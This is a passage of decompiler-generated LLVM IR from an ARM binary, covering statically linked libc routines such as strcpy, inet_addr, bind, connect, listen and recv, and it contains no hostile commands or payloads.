  br i1 %v5_1194c, label %dec_label_pc_11940.dec_label_pc_11968.loopexit_crit_edge, label %dec_label_pc_11950

dec_label_pc_11950:                               ; preds = %dec_label_pc_11940
  %v1_11950 = inttoptr i32 %v6_11940 to i32*
  %v2_11950 = load i32, i32* @r1, align 4
  store i32 %v2_11950, i32* %v1_11950, align 4
  %v3_11950 = add i32 %v0_1193054, 20
  %v4_11950 = inttoptr i32 %v3_11950 to i32*
  %v5_11950 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11950, i32* %v4_11950, align 4
  %v6_11950 = add i32 %v0_1193054, 24
  store i32 %v6_11950, i32* @r3, align 4
  %v0_11954 = load i32, i32* %r2.global-to-local, align 4
  %v1_11954 = add i32 %v0_11954, -8
  store i32 %v1_11954, i32* %r2.global-to-local, align 4
  %v5_1195c = icmp slt i32 %v1_11954, 8
  br i1 %v5_1195c, label %dec_label_pc_11950.dec_label_pc_11968.loopexit_crit_edge, label %dec_label_pc_11928

dec_label_pc_11928:                               ; preds = %dec_label_pc_11950
  %v7_1195c = inttoptr i32 %v6_11950 to i32*
  %v8_1195c = load i32, i32* @r1, align 4
  store i32 %v8_1195c, i32* %v7_1195c, align 4
  %v9_1195c = add i32 %v0_1193054, 28
  %v10_1195c = inttoptr i32 %v9_1195c to i32*
  %v11_1195c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1195c, i32* %v10_1195c, align 4
  %v12_1195c = add i32 %v0_1193054, 32
  store i32 %v12_1195c, i32* @r3, align 4
  %v6_11960 = load i32, i32* %r2.global-to-local, align 4
  %v7_11960 = add i32 %v6_11960, -8
  store i32 %v7_11960, i32* %r2.global-to-local, align 4
  %v5_1192c = icmp slt i32 %v7_11960, 8
  br i1 %v5_1192c, label %dec_label_pc_11928.dec_label_pc_11968.loopexit_crit_edge, label %dec_label_pc_11928.dec_label_pc_11930_crit_edge

dec_label_pc_11928.dec_label_pc_11930_crit_edge:  ; preds = %dec_label_pc_11928
  %v2_11930.pre = load i32, i32* @r1, align 4
  %v1_11930 = inttoptr i32 %v12_1195c to i32*
  store i32 %v2_11930.pre, i32* %v1_11930, align 4
  %v3_11930 = add i32 %v0_1193054, 36
  %v4_11930 = inttoptr i32 %v3_11930 to i32*
  %v5_11930 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11930, i32* %v4_11930, align 4
  %v6_11930 = add i32 %v0_1193054, 40
  store i32 %v6_11930, i32* @r3, align 4
  %v0_11934 = load i32, i32* %r2.global-to-local, align 4
  %v1_11934 = add i32 %v0_11934, -8
  store i32 %v1_11934, i32* %r2.global-to-local, align 4
  %v5_1193c = icmp slt i32 %v1_11934, 8
  br i1 %v5_1193c, label %dec_label_pc_11930.dec_label_pc_11968.loopexit_crit_edge, label %dec_label_pc_11940

dec_label_pc_11928.dec_label_pc_11968.loopexit_crit_edge: ; preds = %dec_label_pc_11928
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11968

dec_label_pc_11930.dec_label_pc_11968.loopexit_crit_edge: ; preds = %dec_label_pc_11928.dec_label_pc_11930_crit_edge, %dec_label_pc_11930.preheader
  %v1_11934.lcssa = phi i32 [ %v1_1193452, %dec_label_pc_11930.preheader ], [ %v1_11934, %dec_label_pc_11928.dec_label_pc_11930_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11968

dec_label_pc_11940.dec_label_pc_11968.loopexit_crit_edge: ; preds = %dec_label_pc_11940
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11968

dec_label_pc_11950.dec_label_pc_11968.loopexit_crit_edge: ; preds = %dec_label_pc_11950
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11968

dec_label_pc_11968:                               ; preds = %dec_label_pc_11924, %dec_label_pc_11928.dec_label_pc_11968.loopexit_crit_edge, %dec_label_pc_11930.dec_label_pc_11968.loopexit_crit_edge, %dec_label_pc_11940.dec_label_pc_11968.loopexit_crit_edge, %dec_label_pc_11950.dec_label_pc_11968.loopexit_crit_edge, %entry
  %v0_11970 = phi i32 [ %arg3, %entry ], [ %v1_11954, %dec_label_pc_11950.dec_label_pc_11968.loopexit_crit_edge ], [ %v1_11944, %dec_label_pc_11940.dec_label_pc_11968.loopexit_crit_edge ], [ %v1_11934.lcssa, %dec_label_pc_11930.dec_label_pc_11968.loopexit_crit_edge ], [ %v7_11960, %dec_label_pc_11928.dec_label_pc_11968.loopexit_crit_edge ], [ %v0_11928.pr, %dec_label_pc_11924 ]
  %v2_11968 = icmp eq i32 %v0_11970, 0
  store i1 %v2_11968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11968, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11968
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11968
  %v1_11970 = sub i32 7, %v0_11970
  store i32 %v1_11970, i32* %r2.global-to-local, align 4
  %v3_11974 = mul i32 %v1_11970, 4
  %v4_11974 = add i32 %v3_11974, ptrtoint (i32* @global_var_1197c.390 to i32)
  call void @__pseudo_branch(i32 %v4_11974)
  %v0_1197c = load i32, i32* @r1, align 4
  %v1_1197c = trunc i32 %v0_1197c to i8
  %v2_1197c = load i32, i32* @r3, align 4
  %v3_1197c = inttoptr i32 %v2_1197c to i8*
  store i8 %v1_1197c, i8* %v3_1197c, align 1
  %v4_1197c = load i32, i32* @r3, align 4
  %v5_1197c = add i32 %v4_1197c, 1
  store i32 %v5_1197c, i32* %r3.global-to-local, align 4
  %v0_11980 = load i32, i32* @r1, align 4
  %v1_11980 = trunc i32 %v0_11980 to i8
  %v3_11980 = inttoptr i32 %v5_1197c to i8*
  store i8 %v1_11980, i8* %v3_11980, align 1
  %v4_11980 = load i32, i32* %r3.global-to-local, align 4
  %v5_11980 = add i32 %v4_11980, 1
  store i32 %v5_11980, i32* %r3.global-to-local, align 4
  %v0_11984 = load i32, i32* @r1, align 4
  %v1_11984 = trunc i32 %v0_11984 to i8
  %v3_11984 = inttoptr i32 %v5_11980 to i8*
  store i8 %v1_11984, i8* %v3_11984, align 1
  %v4_11984 = load i32, i32* %r3.global-to-local, align 4
  %v5_11984 = add i32 %v4_11984, 1
  store i32 %v5_11984, i32* %r3.global-to-local, align 4
  %v0_11988 = load i32, i32* @r1, align 4
  %v1_11988 = trunc i32 %v0_11988 to i8
  %v3_11988 = inttoptr i32 %v5_11984 to i8*
  store i8 %v1_11988, i8* %v3_11988, align 1
  %v4_11988 = load i32, i32* %r3.global-to-local, align 4
  %v5_11988 = add i32 %v4_11988, 1
  store i32 %v5_11988, i32* %r3.global-to-local, align 4
  %v0_1198c = load i32, i32* @r1, align 4
  %v1_1198c = trunc i32 %v0_1198c to i8
  %v3_1198c = inttoptr i32 %v5_11988 to i8*
  store i8 %v1_1198c, i8* %v3_1198c, align 1
  %v4_1198c = load i32, i32* %r3.global-to-local, align 4
  %v5_1198c = add i32 %v4_1198c, 1
  store i32 %v5_1198c, i32* %r3.global-to-local, align 4
  %v0_11990 = load i32, i32* @r1, align 4
  %v1_11990 = trunc i32 %v0_11990 to i8
  %v3_11990 = inttoptr i32 %v5_1198c to i8*
  store i8 %v1_11990, i8* %v3_11990, align 1
  %v4_11990 = load i32, i32* %r3.global-to-local, align 4
  %v5_11990 = add i32 %v4_11990, 1
  store i32 %v5_11990, i32* %r3.global-to-local, align 4
  %v0_11994 = load i32, i32* @r1, align 4
  %v1_11994 = trunc i32 %v0_11994 to i8
  %v3_11994 = inttoptr i32 %v5_11990 to i8*
  store i8 %v1_11994, i8* %v3_11994, align 1
  %v4_11994 = load i32, i32* %r3.global-to-local, align 4
  %v5_11994 = add i32 %v4_11994, 1
  store i32 %v5_11994, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11930, { 1, 0 }
  uselistorder i32 %v12_1195c, { 1, 2, 0 }
  uselistorder i32 %v0_1193054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11928.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11918, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1190c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 4, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11968, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11940, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_119b01 = load i32, i32* @r1, align 4
  %v1_119b02 = inttoptr i32 %v0_119b01 to i8*
  %v2_119b03 = load i8, i8* %v1_119b02, align 1
  %v2_119b45 = icmp eq i8 %v2_119b03, 0
  store i1 %v2_119b45, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_119b03, i8* %arg1, align 1
  br i1 %v2_119b45, label %dec_label_pc_119c0, label %dec_label_pc_119a8

dec_label_pc_119a8:                               ; preds = %entry, %dec_label_pc_119a8
  %v0_119a8 = load i32, i32* @r1, align 4
  %v1_119a8 = add i32 %v0_119a8, 1
  store i32 %v1_119a8, i32* @r1, align 4
  %v0_119ac = load i32, i32* %r2.global-to-local, align 4
  %v1_119ac = add i32 %v0_119ac, 1
  store i32 %v1_119ac, i32* %r2.global-to-local, align 4
  %v1_119b0 = inttoptr i32 %v1_119a8 to i8*
  %v2_119b0 = load i8, i8* %v1_119b0, align 1
  %v2_119b4 = icmp eq i8 %v2_119b0, 0
  store i1 %v2_119b4, i1* %cpsr_z.global-to-local, align 1
  %v3_119b8 = inttoptr i32 %v1_119ac to i8*
  store i8 %v2_119b0, i8* %v3_119b8, align 1
  %v0_119bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_119bc, label %dec_label_pc_119c0, label %dec_label_pc_119a8

dec_label_pc_119c0:                               ; preds = %dec_label_pc_119a8, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_119a8, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_119cc = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_119cc, i32* @r1, align 4
  %v0_119d0 = call i32 @inet_aton()
  %v2_119d4 = icmp eq i32 %v0_119d0, 0
  %v4_119d8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_119d4, i32 -1, i32 %v4_119d8
  ret i32 %storemerge
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_119ec = load i32, i32* @r7, align 4
  store i32 %v3_119ec, i32* %stack_var_-8, align 4
  %v0_119f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_119f8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_119f8, -4095
  br i1 %tmp, label %dec_label_pc_11a20, label %dec_label_pc_11a08

dec_label_pc_11a08:                               ; preds = %entry
  %v0_11a0c = call i32 @__aeabi_read_tp()
  %v3_11a10 = load i16, i16* @global_var_22068.345, align 2
  %v4_11a10 = sext i16 %v3_11a10 to i32
  %v0_11a14 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a14 = sub i32 0, %v0_11a14
  store i32 %v1_11a14, i32* %r2.global-to-local, align 4
  %v3_11a18 = add i32 %v4_11a10, %v0_11a0c
  %v4_11a18 = inttoptr i32 %v3_11a18 to i32*
  store i32 %v1_11a14, i32* %v4_11a18, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11a20.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11a20

dec_label_pc_11a20:                               ; preds = %entry, %dec_label_pc_11a08
  %v1_11a24 = phi i32 [ %v0_119f8, %entry ], [ -1, %dec_label_pc_11a08 ]
  %v2_11a20 = phi i32 [ %v3_119ec, %entry ], [ %v2_11a20.pre, %dec_label_pc_11a08 ]
  store i32 %v2_11a20, i32* @r7, align 4
  ret i32 %v1_11a24

; uselistorder directives
  uselistorder i32 %v0_119f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a20, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11a28:
  %v0_11a28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11a28, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11a28
  %v2_11a28 = load i32, i32* @sl, align 4
  %v8_11a28 = shl i32 %v2_11a28, %arg2
  %v9_11a28 = and i32 %v8_11a28, %arg1
  %v3_11a2c = load i32, i32* @r6, align 4
  %v8_11a2c = ashr i32 %v9_11a28, %v3_11a2c
  %v9_11a2c = and i32 %v8_11a2c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11a28, %bb
  %v10_11a2c = phi i32 [ %arg1, %dec_label_pc_11a28 ], [ %v9_11a2c, %bb ]
  ret i32 %v10_11a2c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11a30 = load i32, i32* @r7, align 4
  store i32 %v3_11a30, i32* %stack_var_-8, align 4
  %v0_11a3c = load i32, i32* @r0, align 4
  store i32 %v0_11a3c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11a3c, -4095
  br i1 %tmp, label %dec_label_pc_11a64, label %dec_label_pc_11a4c

dec_label_pc_11a4c:                               ; preds = %entry
  %v0_11a50 = call i32 @__aeabi_read_tp()
  %v3_11a54 = load i16, i16* @global_var_22068.345, align 2
  %v4_11a54 = sext i16 %v3_11a54 to i32
  store i32 %v4_11a54, i32* @r3, align 4
  %v0_11a58 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a58 = sub i32 0, %v0_11a58
  store i32 %v1_11a58, i32* %r2.global-to-local, align 4
  %v3_11a5c = add i32 %v4_11a54, %v0_11a50
  %v4_11a5c = inttoptr i32 %v3_11a5c to i32*
  store i32 %v1_11a58, i32* %v4_11a5c, align 4
  %v2_11a64.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %entry, %dec_label_pc_11a4c
  %v1_11a68 = phi i32 [ %v0_11a3c, %entry ], [ -1, %dec_label_pc_11a4c ]
  %v2_11a64 = phi i32 [ %v3_11a30, %entry ], [ %v2_11a64.pre, %dec_label_pc_11a4c ]
  store i32 %v2_11a64, i32* @r7, align 4
  ret i32 %v1_11a68

; uselistorder directives
  uselistorder i32 %v0_11a3c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11a64, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11a6c:
  %v0_11a6c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11a6c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11a6c
  %v2_11a70 = load i32, i32* @ip, align 4
  %v5_11a70 = mul i32 %v2_11a70, 4096
  %v6_11a70 = and i32 %v5_11a70, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11a6c, %bb
  %v7_11a70 = phi i32 [ %arg1, %dec_label_pc_11a6c ], [ %v6_11a70, %bb ]
  ret i32 %v7_11a70

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11a78 = load i32, i32* @r4, align 4
  store i32 %v3_11a78, i32* %stack_var_-20, align 4
  %v6_11a78 = load i32, i32* @r5, align 4
  %v9_11a78 = load i32, i32* @r6, align 4
  %v12_11a78 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r3, align 4
  %v4_11a84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 12776) to i32*), align 4
  store i32 %v4_11a84, i32* @ip, align 4
  %v2_11a88 = icmp eq i32 %v4_11a84, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11a88, label %dec_label_pc_11aa0, label %entry.dec_label_pc_11aac_crit_edge

entry.dec_label_pc_11aac_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11aac

dec_label_pc_11aa0:                               ; preds = %entry
  store i32 %v3_11a78, i32* @r4, align 4
  store i32 %v9_11a78, i32* @r6, align 4
  store i32 %v12_11a78, i32* @r7, align 4
  %v0_11aa8 = call i32 @__sys_connect()
  br label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %entry.dec_label_pc_11aac_crit_edge, %dec_label_pc_11aa0
  %v0_11aac = call i32 @__libc_enable_asynccancel()
  %v0_11ab0 = load i32, i32* @r6, align 4
  store i32 %v0_11ab0, i32* @r1, align 4
  store i32 %v0_11aac, i32* @r5, align 4
  %v0_11abc = load i32, i32* @r4, align 4
  store i32 %v0_11abc, i32* @r0, align 4
  %v0_11ac0 = call i32 @__sys_connect()
  store i32 %v0_11ac0, i32* @r4, align 4
  %v0_11ac8 = load i32, i32* @r5, align 4
  %v1_11acc = call i32 @__libc_disable_asynccancel(i32 %v0_11ac8)
  %v0_11ad0 = load i32, i32* @r4, align 4
  %v2_11ad8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11ad8, i32* @r4, align 4
  store i32 %v6_11a78, i32* @r5, align 4
  store i32 %v9_11a78, i32* @r6, align 4
  store i32 %v12_11a78, i32* @r7, align 4
  ret i32 %v0_11ad0

; uselistorder directives
  uselistorder label %dec_label_pc_11aac, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11ae8 = load i32, i32* @r7, align 4
  store i32 %v3_11ae8, i32* %stack_var_-8, align 4
  %v0_11af4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11af4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11af4, -4095
  br i1 %tmp, label %dec_label_pc_11b1c, label %dec_label_pc_11b04

dec_label_pc_11b04:                               ; preds = %entry
  %v0_11b08 = call i32 @__aeabi_read_tp()
  %v3_11b0c = load i16, i16* @global_var_22068.345, align 2
  %v4_11b0c = sext i16 %v3_11b0c to i32
  %v0_11b10 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b10 = sub i32 0, %v0_11b10
  store i32 %v1_11b10, i32* %r2.global-to-local, align 4
  %v3_11b14 = add i32 %v4_11b0c, %v0_11b08
  %v4_11b14 = inttoptr i32 %v3_11b14 to i32*
  store i32 %v1_11b10, i32* %v4_11b14, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11b1c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11b1c

dec_label_pc_11b1c:                               ; preds = %entry, %dec_label_pc_11b04
  %v1_11b20 = phi i32 [ %v0_11af4, %entry ], [ -1, %dec_label_pc_11b04 ]
  %v2_11b1c = phi i32 [ %v3_11ae8, %entry ], [ %v2_11b1c.pre, %dec_label_pc_11b04 ]
  store i32 %v2_11b1c, i32* @r7, align 4
  ret i32 %v1_11b20

; uselistorder directives
  uselistorder i32 %v0_11af4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b1c, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11b24:
  %v0_11b24 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11b24, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11b24
  %v2_11b28 = load i32, i32* @r4, align 4
  %v3_11b28 = load i32, i32* @r5, align 4
  %v8_11b28 = ashr i32 %v2_11b28, %v3_11b28
  %v9_11b28 = and i32 %v8_11b28, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11b24, %bb
  %v10_11b28 = phi i32 [ %arg1, %dec_label_pc_11b24 ], [ %v9_11b28, %bb ]
  ret i32 %v10_11b28

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11b2c = load i32, i32* @r4, align 4
  store i32 %v3_11b2c, i32* %stack_var_-12, align 4
  %v0_11b3c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11b3c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11b3c, -4095
  br i1 %tmp, label %dec_label_pc_11b64, label %dec_label_pc_11b4c

dec_label_pc_11b4c:                               ; preds = %entry
  %v0_11b50 = call i32 @__aeabi_read_tp()
  %v3_11b54 = load i16, i16* @global_var_22068.345, align 2
  %v4_11b54 = sext i16 %v3_11b54 to i32
  %v0_11b58 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b58 = sub i32 0, %v0_11b58
  store i32 %v1_11b58, i32* %r2.global-to-local, align 4
  %v3_11b5c = add i32 %v4_11b54, %v0_11b50
  %v4_11b5c = inttoptr i32 %v3_11b5c to i32*
  store i32 %v1_11b58, i32* %v4_11b5c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11b64.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11b64

dec_label_pc_11b64:                               ; preds = %entry, %dec_label_pc_11b4c
  %v1_11b68 = phi i32 [ %v0_11b3c, %entry ], [ -1, %dec_label_pc_11b4c ]
  %v2_11b64 = phi i32 [ %v3_11b2c, %entry ], [ %v2_11b64.pre, %dec_label_pc_11b4c ]
  store i32 %v2_11b64, i32* @r4, align 4
  ret i32 %v1_11b68

; uselistorder directives
  uselistorder i32 %v0_11b3c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b64, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11b6c:
  %v0_11b6c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11b6c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11b6c
  %v2_11b70 = load i32, i32* @ip, align 4
  %v5_11b70 = mul i32 %v2_11b70, 1024
  %v6_11b70 = and i32 %v5_11b70, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11b6c, %bb
  %v7_11b70 = phi i32 [ %arg1, %dec_label_pc_11b6c ], [ %v6_11b70, %bb ]
  ret i32 %v7_11b70

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11b74 = load i32, i32* @r7, align 4
  store i32 %v3_11b74, i32* %stack_var_-8, align 4
  %v0_11b80 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11b80, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11b80, -4095
  br i1 %tmp, label %dec_label_pc_11ba8, label %dec_label_pc_11b90

dec_label_pc_11b90:                               ; preds = %entry
  %v0_11b94 = call i32 @__aeabi_read_tp()
  %v3_11b98 = load i16, i16* @global_var_22068.345, align 2
  %v4_11b98 = sext i16 %v3_11b98 to i32
  %v0_11b9c = load i32, i32* %r2.global-to-local, align 4
  %v1_11b9c = sub i32 0, %v0_11b9c
  store i32 %v1_11b9c, i32* %r2.global-to-local, align 4
  %v3_11ba0 = add i32 %v4_11b98, %v0_11b94
  %v4_11ba0 = inttoptr i32 %v3_11ba0 to i32*
  store i32 %v1_11b9c, i32* %v4_11ba0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11ba8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11ba8

dec_label_pc_11ba8:                               ; preds = %entry, %dec_label_pc_11b90
  %v1_11bac = phi i32 [ %v0_11b80, %entry ], [ -1, %dec_label_pc_11b90 ]
  %v2_11ba8 = phi i32 [ %v3_11b74, %entry ], [ %v2_11ba8.pre, %dec_label_pc_11b90 ]
  store i32 %v2_11ba8, i32* @r7, align 4
  ret i32 %v1_11bac

; uselistorder directives
  uselistorder i32 %v0_11b80, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ba8, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11bb4 = load i32, i32* @r7, align 4
  store i32 %v3_11bb4, i32* %stack_var_-8, align 4
  %v0_11bc0 = load i32, i32* @r0, align 4
  store i32 %v0_11bc0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11bc0, -4095
  br i1 %tmp, label %dec_label_pc_11be8, label %dec_label_pc_11bd0

dec_label_pc_11bd0:                               ; preds = %entry
  %v0_11bd4 = call i32 @__aeabi_read_tp()
  %v3_11bd8 = load i16, i16* @global_var_22068.345, align 2
  %v4_11bd8 = sext i16 %v3_11bd8 to i32
  %v0_11bdc = load i32, i32* %r2.global-to-local, align 4
  %v1_11bdc = sub i32 0, %v0_11bdc
  store i32 %v1_11bdc, i32* %r2.global-to-local, align 4
  %v3_11be0 = add i32 %v4_11bd8, %v0_11bd4
  %v4_11be0 = inttoptr i32 %v3_11be0 to i32*
  store i32 %v1_11bdc, i32* %v4_11be0, align 4
  %v2_11be8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11be8

dec_label_pc_11be8:                               ; preds = %entry, %dec_label_pc_11bd0
  %v1_11bec = phi i32 [ %v0_11bc0, %entry ], [ -1, %dec_label_pc_11bd0 ]
  %v2_11be8 = phi i32 [ %v3_11bb4, %entry ], [ %v2_11be8.pre, %dec_label_pc_11bd0 ]
  store i32 %v2_11be8, i32* @r7, align 4
  ret i32 %v1_11bec

; uselistorder directives
  uselistorder i32 %v0_11bc0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11be8, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11bf0:
  %v0_11bf0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11bf0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11bf0
  %v2_11bf4 = load i32, i32* @r8, align 4
  %v5_11bf4 = mul i32 %v2_11bf4, 512
  %v6_11bf4 = and i32 %v5_11bf4, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11bf0, %bb
  %v7_11bf4 = phi i32 [ %arg1, %dec_label_pc_11bf0 ], [ %v6_11bf4, %bb ]
  ret i32 %v7_11bf4

; uselistorder directives
  uselistorder i32 512, { 0, 8, 5, 1, 6, 9, 2, 10, 3, 11, 4, 12, 7, 13 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11bfc = load i32, i32* @r4, align 4
  store i32 %v3_11bfc, i32* %stack_var_-24, align 4
  %v6_11bfc = load i32, i32* @r5, align 4
  %v9_11bfc = load i32, i32* @r6, align 4
  %v12_11bfc = load i32, i32* @r7, align 4
  %v15_11bfc = load i32, i32* @r8, align 4
  %v18_11bfc = load i32, i32* @lr, align 4
  %v4_11c08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 12776) to i32*), align 4
  %v2_11c0c = icmp eq i32 %v4_11c08, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11c0c, label %dec_label_pc_11c24, label %entry.dec_label_pc_11c2c_crit_edge

entry.dec_label_pc_11c2c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11c2c

dec_label_pc_11c24:                               ; preds = %entry
